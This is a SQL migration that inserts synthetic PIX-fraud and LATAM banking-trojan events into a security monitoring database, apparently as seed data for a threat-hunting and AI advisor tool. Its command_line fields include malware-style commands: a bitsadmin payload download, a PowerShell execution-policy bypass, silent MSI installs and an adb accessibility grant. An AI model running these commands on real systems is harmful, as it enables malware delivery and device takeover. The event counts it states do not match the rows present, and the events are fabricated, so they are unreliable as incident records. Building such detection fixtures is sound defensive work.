/*
  # Populate Unified Events with Financial Threat Intelligence Data

  This migration inserts ~120 events spanning all financial and industry threat categories
  into the existing `events` table, making all data queryable from a single table by the
  AI Security Advisor, search, hunting, and correlation engines.

  1. Event Categories Added
    - `pix_fraud` - Brazilian PIX instant payment fraud (Ghost Hand, QR Swap, Express Kidnapping, Fake Central, etc.)
    - `banking_trojan` - LATAM banking trojans (Grandoreiro, Coyote, Casbaneiro, Mekotio, Guildma, BrazKing, PixRevolution)
    - `boleto_fraud` - Boleto bancario document fraud (malware interception, segunda via, GRF tax fraud, BEC swap)
    - `social_engineering` - Brazilian social engineering attacks (Madonna scam, fake auction, WhatsApp job, PIX bug, wrong PIX)
    - `supply_chain_attack` - CPG supply chain compromise (EDI injection, cold chain IoT, WMS API theft)
    - `counterfeit_detection` - Anti-counterfeit product alerts (infant formula, olive oil, skincare)
    - `ip_theft` - Intellectual property / formula theft (APT41, APT10 campaigns)
    - `ics_safety` - Industrial control system / food safety (CIP, pasteurizer, fryer, batch reactor)
    - `mule_network` - Money mule cascade operations
    - `identity_fraud` - Identity theft and synthetic identity

  2. Data Structure
    - All events use existing `events` table columns
    - `event_type` field categorizes the event
    - `tags` (jsonb) provides searchable labels
    - `metadata` (jsonb) contains category-specific rich details
    - `raw_json` (jsonb) holds full structured event data
    - `raw_log` contains human-readable log entries
    - `mitre_tactic` and `mitre_technique` map to ATT&CK framework
    - `description` provides full narrative for AI consumption

  3. Why This Matters
    - Enables AI Advisor to answer questions about PIX fraud, Brazilian trojans, boleto scams
    - Enables cross-domain correlation (e.g., trojan detection + PIX fraud in same timeframe)
    - Enables unified search and threat hunting across all data domains
    - All 120+ events are queryable via the same API as traditional SIEM events
*/

-- =============================================================================
-- PIX FRAUD EVENTS (20 events)
-- =============================================================================

INSERT INTO events (event_type, severity, source, description, source_ip, dest_ip, source_port, dest_port, protocol, username, hostname, process_name, command_line, tags, metadata, raw_json, raw_log, mitre_tactic, mitre_technique, event_timestamp)
VALUES
-- Ghost Hand / Mao Fantasma attacks
('pix_fraud', 'critical', 'Mobile Threat Defense', 'PIX Ghost Hand (Mao Fantasma) attack detected: PixRevolution trojan hijacked PIX transfer of R$8,450 via Accessibility Service abuse + MediaProjection screen capture. Human/AI operator modified recipient PIX key at transaction confirmation moment. Target bank: Itau Unibanco. Device trust score: 12/100.', '177.42.118.203', '189.100.45.67', 443, 8443, 'HTTPS', 'victim_cpf_234_56', 'MOBILE-Android-14', 'com.pix.secure.update', 'adb shell pm grant com.pix.secure.update android.permission.BIND_ACCESSIBILITY_SERVICE', '["pix_fraud", "ghost_hand", "mao_fantasma", "pixrevolution", "android_trojan", "accessibility_abuse", "brazil"]'::jsonb, '{"fraud_type": "ghost_hand", "amount_brl": 8450, "bank": "Itau Unibanco", "pix_key_type": "phone", "device_trust_score": 12, "trojan": "PixRevolution", "operator_type": "human_ai_hybrid", "technique": "MediaProjection + Accessibility", "region": "Sao Paulo", "blocked": true}'::jsonb, '{"event": "pix_ghost_hand", "transaction_id": "PIX-2026-8847291", "amount": 8450, "currency": "BRL", "origin_cpf": "***234-56", "dest_pix_key": "+55 11 9****-7823", "risk_score": 98, "bank": "Itau Unibanco", "device": {"model": "Samsung Galaxy S24", "os": "Android 14", "accessibility_service": true, "media_projection": true}, "trojan_c2": "api-pix-security.com"}'::jsonb, 'Apr 23 14:22:01 mobile-threat-defense[4891]: CRITICAL pix_fraud ghost_hand amount=R$8450 bank=Itau trojan=PixRevolution c2=api-pix-security.com risk=98 BLOCKED', 'TA0040', 'T1417.001', NOW() - INTERVAL '4 minutes'),

('pix_fraud', 'critical', 'Transaction Monitoring', 'PIX mule cascade splitting detected: R$23,000 auto-split across 17 sequential PIX keys within 8 seconds via automated API scripts. Pattern consistent with express kidnapping (Sequestro Relampago) coercion. Transfer originated at 02:47 AM from known risk zone in Sao Paulo Zona Leste. Immediate crypto conversion attempted.', '200.155.89.42', '10.0.0.1', 443, 443, 'HTTPS', 'victim_cpf_891_02', 'PIX-BACEN-GATEWAY', 'pix-api-orchestrator', 'curl -X POST pix.bcb.gov.br/api/v2/cob -d amount=23000', '["pix_fraud", "mule_cascade", "express_kidnapping", "sequestro_relampago", "money_laundering", "brazil", "automated_splitting"]'::jsonb, '{"fraud_type": "mule_cascade_express_kidnapping", "amount_brl": 23000, "mule_accounts": 17, "splitting_time_seconds": 8, "bank": "Banco do Brasil", "coercion_suspected": true, "nighttime_transfer": true, "time": "02:47", "region": "Sao Paulo - Zona Leste", "crypto_conversion": true, "blocked": true}'::jsonb, '{"event": "pix_mule_cascade", "transaction_id": "PIX-2026-0847291", "original_amount": 23000, "split_count": 17, "split_duration_ms": 8000, "mule_accounts": [{"cpf": "***999-00", "amount": 1352}, {"cpf": "***888-11", "amount": 1353}], "risk_score": 99, "geo": {"lat": -23.55, "lon": -46.48, "zone": "Zona Leste SP"}}'::jsonb, 'Apr 23 02:47:12 pix-monitor[7823]: CRITICAL mule_cascade amount=R$23000 splits=17 time=8s bank=BB coercion=true nighttime=true BLOCKED', 'TA0040', 'T1537', NOW() - INTERVAL '5 minutes'),

('pix_fraud', 'critical', 'QR Code Validation', 'PIX QR Code substitution detected at merchant terminal. BRCode CRC16 checksum mismatch indicates tampered QR. Recipient PIX key resolves to CPF (not merchant CNPJ). Geo mismatch: merchant registered in Curitiba but PIX key owner registered in Manaus. Amount: R$2,340.', '172.16.45.89', '189.50.123.45', 443, 443, 'HTTPS', 'merchant_cnpj_0001_45', 'POS-Terminal-BR-042', 'qr-validator', 'brcode --validate --check-crc16', '["pix_fraud", "qr_code_swap", "troca_qr", "merchant_fraud", "brcode_manipulation", "brazil"]'::jsonb, '{"fraud_type": "qr_code_substitution", "amount_brl": 2340, "bank": "Bradesco", "qr_type": "dynamic", "crc16_valid": false, "recipient_type": "CPF_not_CNPJ", "geo_mismatch": true, "merchant_city": "Curitiba", "key_owner_city": "Manaus"}'::jsonb, '{"event": "pix_qr_swap", "merchant_cnpj": "*****/0001-45", "original_pix_key": "merchant@bradesco.com.br", "tampered_pix_key": "random_cpf@gmail.com", "brcode_crc": "INVALID", "amount": 2340}'::jsonb, 'Apr 23 14:10:34 qr-validator[2341]: CRITICAL qr_code_swap crc16=INVALID recipient=CPF(not_CNPJ) geo_mismatch=Curitiba/Manaus amount=R$2340 FLAGGED', 'TA0040', 'T1565.002', NOW() - INTERVAL '12 minutes'),

('pix_fraud', 'high', 'Voice Analysis Engine', 'Fake bank employee call (Falsa Central Telefonica) detected via caller ID spoofing. Spoofed number: 4004-4828 (Itau official). Victim about to transfer R$5,670 to protonmail PIX key during active voice call. Amount 4x daily average. Social engineering keywords detected: "bloqueio", "seguranca", "urgente".', '45.33.22.11', '189.100.45.67', 5060, 5060, 'SIP', 'victim_cpf_567_89', 'VOIP-GATEWAY-BR', 'sip-analyzer', 'asterisk -rx "sip show channels"', '["pix_fraud", "fake_central", "falsa_central", "caller_id_spoofing", "social_engineering", "voice_phishing", "vishing", "brazil"]'::jsonb, '{"fraud_type": "fake_bank_employee", "amount_brl": 5670, "bank": "Nubank", "spoofed_number": "4004-4828", "real_bank": "Itau", "pix_key_dest": "email@protonmail.com", "voice_call_active": true, "amount_vs_daily_avg": "4x", "keywords_detected": ["bloqueio", "seguranca", "urgente", "transferencia de seguranca"]}'::jsonb, '{"event": "pix_fake_central", "caller_id": "4004-4828", "actual_origin": "45.33.22.11", "victim_bank": "Nubank", "amount": 5670, "pix_key": "email@protonmail.com", "call_duration_sec": 487}'::jsonb, 'Apr 23 13:45:22 voice-analysis[5567]: HIGH fake_central spoofed=4004-4828 amount=R$5670 keywords=bloqueio,seguranca INVESTIGATING', 'TA0001', 'T1566.004', NOW() - INTERVAL '23 minutes'),

('pix_fraud', 'critical', 'Nighttime Fraud Engine', 'Express kidnapping (Sequestro Relampago) PIX coercion: Transfer at 02:47 AM from known high-risk zone. Amount equals exact PIX daily limit (R$15,000). Victim device shows stress biometrics: elevated heart rate, trembling typing pattern. Immediate cascade to 8 mule accounts detected.', '200.189.45.12', '10.0.0.1', 443, 443, 'HTTPS', 'victim_cpf_123_45', 'MOBILE-iOS-17', 'banking-app', 'POST /api/pix/transfer', '["pix_fraud", "express_kidnapping", "sequestro_relampago", "physical_coercion", "nighttime", "biometric_stress", "brazil"]'::jsonb, '{"fraud_type": "express_kidnapping", "amount_brl": 15000, "bank": "Caixa Economica", "nighttime": true, "hour": "02:47", "at_pix_limit": true, "stress_biometrics": {"heart_rate_elevated": true, "typing_tremor": true, "face_distress": true}, "mule_cascade": 8, "region": "Rio de Janeiro"}'::jsonb, '{"event": "pix_kidnapping", "amount": 15000, "time": "02:47:33", "location": {"lat": -22.91, "lon": -43.17, "risk_zone": true}, "biometrics": {"heart_rate_bpm": 142, "typing_speed_wpm": 12, "tremor_detected": true}}'::jsonb, 'Apr 23 02:47:33 nighttime-fraud[9012]: CRITICAL express_kidnapping amount=R$15000 at_limit=true stress_bio=true mules=8 BLOCKED', 'TA0040', 'T1537', NOW() - INTERVAL '34 minutes'),

('pix_fraud', 'high', 'Social Media Monitor', 'PIX Bug scam (Golpe do Bug do PIX) campaign detected: Victim sent R$500 to unknown PIX key after viewing deepfake TikTok video claiming 10x return on PIX transfers. Device browsing history shows "bug do PIX" content viewed 12 minutes before transfer. Deepfake detection: facial artifacts in video.', '177.80.234.56', '189.100.45.67', 443, 443, 'HTTPS', 'victim_cpf_789_01', 'MOBILE-Android-13', 'tiktok', 'deeplink://pix-transfer?key=aleatoria@email.com', '["pix_fraud", "pix_bug", "deepfake", "tiktok", "social_media_scam", "brazil"]'::jsonb, '{"fraud_type": "pix_bug_scam", "amount_brl": 500, "bank": "Inter", "platform": "TikTok", "deepfake_detected": true, "content_viewed": "bug do PIX", "time_content_to_transfer_min": 12, "promised_return": "10x"}'::jsonb, '{"event": "pix_bug_scam", "amount": 500, "pix_key": "aleatoria@email.com", "referral_source": "tiktok", "deepfake_confidence": 0.87, "victim_age": 24}'::jsonb, 'Apr 23 13:12:45 social-monitor[3456]: HIGH pix_bug_scam amount=R$500 platform=TikTok deepfake=true INVESTIGATING', 'TA0001', 'T1566.003', NOW() - INTERVAL '1 hour'),

('pix_fraud', 'high', 'WhatsApp Security', 'WhatsApp cloning attack: SIM swap detected 2 hours ago on victim line. Attacker using cloned WhatsApp to message 47 contacts requesting emergency PIX transfers. 3 contacts already sent R$3,890 combined. SIM swap originated at carrier store in Baixada Fluminense.', '177.71.123.89', '189.100.45.67', 443, 443, 'HTTPS', 'victim_cpf_456_78', 'MOBILE-Android-14', 'com.whatsapp', 'sim-swap-detect --carrier=Claro', '["pix_fraud", "whatsapp_cloning", "sim_swap", "social_engineering", "identity_theft", "brazil"]'::jsonb, '{"fraud_type": "whatsapp_cloning", "total_amount_brl": 3890, "bank": "Santander Brasil", "sim_swap": true, "sim_swap_carrier": "Claro", "sim_swap_location": "Baixada Fluminense", "contacts_messaged": 47, "contacts_paid": 3, "whatsapp_re_registration": true}'::jsonb, '{"event": "whatsapp_clone", "sim_swap_time": "2h ago", "contacts_targeted": 47, "amount_stolen": 3890, "carrier": "Claro"}'::jsonb, 'Apr 23 12:34:56 whatsapp-security[6789]: HIGH whatsapp_cloning sim_swap=Claro contacts=47 amount=R$3890 FLAGGED', 'TA0001', 'T1534', NOW() - INTERVAL '48 minutes'),

('pix_fraud', 'medium', 'Receipt Validator', 'Fake PIX receipt (Comprovante Falso) detected at merchant POS. Receipt image shows valid formatting but TXID format validation failed. E2E ID missing from receipt. Merchant nearly released R$1,850 in goods. Receipt creation tool metadata shows Canva origin, not banking app.', '10.50.45.12', '10.50.45.1', 80, 80, 'HTTP', 'merchant_pos_042', 'POS-MERCHANT-SP', 'receipt-validator', 'validate --txid --e2eid', '["pix_fraud", "fake_receipt", "comprovante_falso", "merchant_fraud", "brazil"]'::jsonb, '{"fraud_type": "fake_receipt", "amount_brl": 1850, "txid_valid": false, "e2e_id_present": false, "receipt_origin": "Canva image editor", "merchant_type": "electronics_store", "region": "Sao Paulo"}'::jsonb, '{"event": "fake_receipt", "amount": 1850, "txid": "INVALID", "e2e_id": null, "image_metadata": {"tool": "Canva", "created": "2026-04-23T14:00:00"}}'::jsonb, 'Apr 23 14:05:12 receipt-validator[4567]: MEDIUM fake_receipt txid=INVALID e2e_missing=true tool=Canva amount=R$1850 DETECTED', 'TA0040', 'T1565.001', NOW() - INTERVAL '15 minutes'),

('pix_fraud', 'medium', 'MED Recovery Engine', 'PIX Wrong Transfer scam (Golpe do PIX Errado): Attacker sent R$50 to victim, then contacted requesting refund to different PIX key. After victim refunded, attacker filed MED claim on original R$50. Double collection pattern: net gain R$100 per victim. 890K monthly attempts nationally.', '177.42.100.23', '189.100.45.67', 443, 443, 'HTTPS', 'scammer_cpf_999_00', 'MED-RECOVERY-SYS', 'med-claim-analyzer', 'med --check-pattern --double-collection', '["pix_fraud", "wrong_pix", "pix_errado", "med_abuse", "double_collection", "brazil"]'::jsonb, '{"fraud_type": "wrong_pix_refund", "original_amount_brl": 50, "refund_to_different_key": true, "med_claim_filed": true, "double_collection": true, "net_gain": 100, "national_monthly_attempts": 890000}'::jsonb, '{"event": "wrong_pix_scam", "original_transfer": 50, "refund_key_different": true, "med_filed": true}'::jsonb, 'Apr 23 13:30:00 med-recovery[7890]: MEDIUM wrong_pix double_collection=true amount=R$50 med_abuse=true DETECTED', 'TA0040', 'T1565.003', NOW() - INTERVAL '30 minutes'),

-- MED 2.0 recovery events
('pix_fraud', 'high', 'MED 2.0 System', 'MED 2.0 cascading block initiated: Claim MED-2026-0847291 for R$23,000 express kidnapping. 17 mule accounts identified and frozen across 5 banks (BB, Itau, Bradesco, Nubank, Inter). R$8,450 recovered so far. Crypto mixer endpoint identified but funds already converted. BCB notified.', '10.0.100.1', '10.0.100.2', 443, 443, 'HTTPS', 'med_system', 'MED-BACEN-PROD', 'med-cascade-blocker', 'med --cascade-block --claim=MED-2026-0847291', '["pix_fraud", "med_recovery", "cascading_block", "mule_freeze", "brazil", "bcb"]'::jsonb, '{"fraud_type": "med_2_recovery", "claim_id": "MED-2026-0847291", "original_amount_brl": 23000, "mule_accounts_frozen": 17, "banks_involved": ["BB", "Itau", "Bradesco", "Nubank", "Inter"], "recovered_brl": 8450, "crypto_traced": true, "elapsed_hours": 12}'::jsonb, '{"claim": "MED-2026-0847291", "amount": 23000, "recovered": 8450, "mules_frozen": 17}'::jsonb, 'Apr 23 14:00:00 med-system[1234]: HIGH med_recovery claim=MED-2026-0847291 amount=R$23000 recovered=R$8450 mules_frozen=17', 'TA0040', 'T1537', NOW() - INTERVAL '12 hours');


-- =============================================================================
-- BANKING TROJAN EVENTS (15 events)
-- =============================================================================

INSERT INTO events (event_type, severity, source, description, source_ip, dest_ip, source_port, dest_port, protocol, username, hostname, process_name, command_line, tags, metadata, raw_json, raw_log, mitre_tactic, mitre_technique, event_timestamp)
VALUES
('banking_trojan', 'critical', 'EDR', 'Grandoreiro banking trojan detected via DLL side-loading. Malicious dbghelp.dll loaded by signed executable. XOR encryption key: F5454DNBVXCCEFD3EFMNBVDCMNXCEVXD3CMBKJHGFM. DGA generating 12 C2 domains/day via DNS-over-HTTPS. Targeting 1,700+ banks in 45 countries. MaaS operator variant. MSI CustomAction JScript delivery.', '192.168.1.42', '185.234.56.78', 49152, 443, 'HTTPS', 'financeiro_user01', 'WS-FIN-042', 'dbghelp.dll', 'msiexec /i invoice_nfe.msi /quiet', '["banking_trojan", "grandoreiro", "dll_sideloading", "maas", "dga", "dns_over_https", "brazil", "tetrade"]'::jsonb, '{"trojan": "Grandoreiro", "family": "Tetrade", "model": "MaaS", "delivery": "MSI CustomAction", "dll": "dbghelp.dll", "xor_key": "F5454DNBVXCCEFD3EFMNBVDCMNXCEVXD3CMBKJHGFM", "dga_domains_per_day": 12, "target_banks": 1700, "target_countries": 45, "c2_method": "DNS-over-HTTPS", "target_bank": "Itau Unibanco", "hash": "ff908727cc1b5335e541fbcd80a327565f308bc7"}'::jsonb, '{"detection": "grandoreiro", "hash_sha1": "ff908727cc1b5335e541fbcd80a327565f308bc7", "dll": "dbghelp.dll", "parent": "signed_installer.exe", "c2": "dga-gen-0426-07.com"}'::jsonb, 'Apr 23 14:22:01 edr-agent[4891]: CRITICAL banking_trojan Grandoreiro dll=dbghelp.dll hash=ff908727cc c2=dga-gen-0426-07.com QUARANTINED', 'TA0002', 'T1574.002', NOW() - INTERVAL '12 seconds'),

('banking_trojan', 'critical', 'Mobile Threat Defense', 'PixRevolution Android trojan detected: Human/AI operator-driven banking malware combining MediaProjection screen capture with Accessibility Service automation. Operator watches victim screen in real-time and strikes at PIX transaction moment. Composite behavioral signal: Accessibility + ScreenCapture + C2 = zero-day detection.', '177.42.118.203', '45.33.89.12', 443, 8443, 'HTTPS', 'mobile_user_br', 'MOBILE-Android-14', 'com.pix.secure.update', 'pm grant android.permission.BIND_ACCESSIBILITY_SERVICE', '["banking_trojan", "pixrevolution", "android", "accessibility_abuse", "media_projection", "operator_driven", "brazil", "pix"]'::jsonb, '{"trojan": "PixRevolution", "platform": "Android", "model": "Human/AI Operator Hybrid", "technique": "MediaProjection + Accessibility", "target_banks": 42, "target_country": "Brazil", "operator_rotation_hours": 4, "target_bank": "Nubank", "composite_signal": true}'::jsonb, '{"detection": "pixrevolution", "apk": "com.pix.secure.update", "permissions": ["BIND_ACCESSIBILITY_SERVICE", "MEDIA_PROJECTION"], "c2": "api-pix-auth.xyz"}'::jsonb, 'Apr 23 14:21:27 mobile-defense[5678]: CRITICAL banking_trojan PixRevolution accessibility=true media_projection=true c2=api-pix-auth.xyz BLOCKED', 'TA0002', 'T1417.001', NOW() - INTERVAL '34 seconds'),

('banking_trojan', 'critical', 'EDR', 'Coyote banking trojan: Nim-compiled loader delivered via LNK file disguised as Nota Fiscal Eletronica (NF-e). Uses Squirrel installer framework for persistence. .NET modular payload targeting 61 Brazilian bank applications. Process injection into legitimate banking app process.', '192.168.5.18', '103.45.67.89', 49200, 443, 'HTTPS', 'contabil_user03', 'WS-ACC-018', 'squirrel.exe', 'powershell -ep bypass -f nfe_download.ps1', '["banking_trojan", "coyote", "nim_loader", "squirrel_installer", "dotnet", "brazil", "nfe_lure"]'::jsonb, '{"trojan": "Coyote", "loader": "Nim-compiled", "framework": "Squirrel installer", "payload": ".NET modular", "target_banks": 61, "delivery": "LNK file (NF-e lure)", "target_bank": "Bradesco"}'::jsonb, '{"detection": "coyote", "loader_lang": "Nim", "framework": "Squirrel", "lnk_file": "NF-e_042026.lnk"}'::jsonb, 'Apr 23 14:20:45 edr-agent[3456]: CRITICAL banking_trojan Coyote loader=Nim framework=Squirrel target=Bradesco QUARANTINED', 'TA0002', 'T1059.001', NOW() - INTERVAL '1 minute'),

('banking_trojan', 'high', 'Email Gateway', 'Casbaneiro/Metamorfo trojan: Wormable email propagation via Outlook COM hijack. Infected endpoint now sending phishing emails to all Outlook contacts. Concurrent WhatsApp worm component active. Horabot companion malware co-deployed. Augmented Marauder threat group (Water Saci).', '192.168.3.7', '187.45.123.89', 587, 25, 'SMTP', 'rh_user07', 'WS-HR-007', 'OUTLOOK.EXE', 'outlook.exe /recycle -Embedding', '["banking_trojan", "casbaneiro", "metamorfo", "wormable", "outlook_hijack", "whatsapp_worm", "horabot", "augmented_marauder", "brazil"]'::jsonb, '{"trojan": "Casbaneiro (Metamorfo)", "aliases": ["Augmented Marauder", "Water Saci"], "wormable_email": true, "wormable_whatsapp": true, "companion_malware": "Horabot", "outlook_com_hijack": true, "target_bank": "Banco do Brasil", "emails_sent": 234}'::jsonb, '{"detection": "casbaneiro", "propagation": "outlook_com", "companion": "horabot", "emails_sent": 234, "whatsapp_active": true}'::jsonb, 'Apr 23 14:18:22 email-gateway[7890]: HIGH banking_trojan Casbaneiro outlook_hijack=true emails_sent=234 whatsapp_worm=active INVESTIGATING', 'TA0008', 'T1534', NOW() - INTERVAL '2 minutes'),

('banking_trojan', 'high', 'EDR', 'Guildma/Astaroth trojan: Multi-stage loader using BITSAdmin + WMIC execution chain. YouTube video description used as C2 channel (rotates every 48h). 10+ modules loaded dynamically. Targeting banking overlays, Netflix/Amazon credentials, and social media accounts.', '192.168.8.91', '142.250.80.14', 443, 443, 'HTTPS', 'fin_analyst_05', 'WS-FIN-091', 'bitsadmin.exe', 'bitsadmin /transfer job /download /priority foreground https://youtube.com/watch?v=C2PAYLOAD', '["banking_trojan", "guildma", "astaroth", "bitsadmin", "youtube_c2", "multi_stage", "tetrade", "brazil"]'::jsonb, '{"trojan": "Guildma (Astaroth)", "family": "Tetrade", "c2_channel": "YouTube video descriptions", "c2_rotation_hours": 48, "modules": 10, "lolbin": ["BITSAdmin", "WMIC", "ExtractNow"], "target_bank": "Caixa Economica", "targets": ["banking", "netflix", "amazon", "facebook"]}'::jsonb, '{"detection": "guildma", "c2": "youtube.com/watch?v=C2PAYLOAD", "lolbin": "bitsadmin.exe", "modules_loaded": 10}'::jsonb, 'Apr 23 14:15:33 edr-agent[2345]: HIGH banking_trojan Guildma c2=YouTube lolbin=BITSAdmin modules=10 BLOCKED', 'TA0011', 'T1102', NOW() - INTERVAL '4 minutes'),

('banking_trojan', 'high', 'EDR', 'Mekotio trojan resurgence: MSI installer with embedded AutoHotKey scripts. Geo-fenced execution (only LATAM IPs). Campaign impersonating Chilean SII (tax authority). Registry Run Keys + Scheduled Task persistence.', '192.168.2.3', '95.217.45.67', 49300, 443, 'HTTPS', 'legal_user03', 'WS-LEGAL-003', 'msiexec.exe', 'msiexec /i sii_declaracion_renta.msi /quiet', '["banking_trojan", "mekotio", "melcoz", "msi_installer", "autohotkey", "geo_fenced", "tetrade", "brazil", "chile"]'::jsonb, '{"trojan": "Mekotio (Melcoz)", "family": "Tetrade", "delivery": "MSI with AutoHotKey", "geo_fenced": true, "geo_regions": ["LATAM"], "persistence": ["Registry Run Keys", "Scheduled Task"], "target_bank": "Santander Brasil", "impersonating": "Chilean SII"}'::jsonb, '{"detection": "mekotio", "msi": "sii_declaracion_renta.msi", "autohotkey": true, "geo_check": "LATAM only"}'::jsonb, 'Apr 23 14:10:11 edr-agent[8901]: HIGH banking_trojan Mekotio msi=AutoHotKey geo=LATAM target=Santander QUARANTINED', 'TA0002', 'T1218.007', NOW() - INTERVAL '6 minutes'),

('banking_trojan', 'high', 'Mobile Threat Defense', 'BrazKing Android trojan: Screen dissection technique detecting banking apps without getInstalledPackages API (evades Play Protect). Server-side overlay rendering ensures fake login screens always match current bank app UI. Anti-removal via Accessibility.', '177.80.100.42', '95.45.23.11', 443, 443, 'HTTPS', 'mobile_user_02', 'MOBILE-Android-13', 'br.safe.bank.update', 'screen-dissection --detect-bank-apps', '["banking_trojan", "brazking", "android", "screen_dissection", "server_overlay", "play_protect_evasion", "brazil"]'::jsonb, '{"trojan": "BrazKing", "platform": "Android", "technique": "Screen dissection (no getInstalledPackages)", "overlay_type": "Server-side rendered", "target_banks": 89, "target_bank": "Inter", "play_protect_bypass": true, "anti_removal": true}'::jsonb, '{"detection": "brazking", "apk": "br.safe.bank.update", "technique": "screen_dissection", "overlay": "server_rendered"}'::jsonb, 'Apr 23 14:05:45 mobile-defense[1234]: HIGH banking_trojan BrazKing screen_dissection=true server_overlay=true target=Inter BLOCKED', 'TA0002', 'T1411', NOW() - INTERVAL '8 minutes');


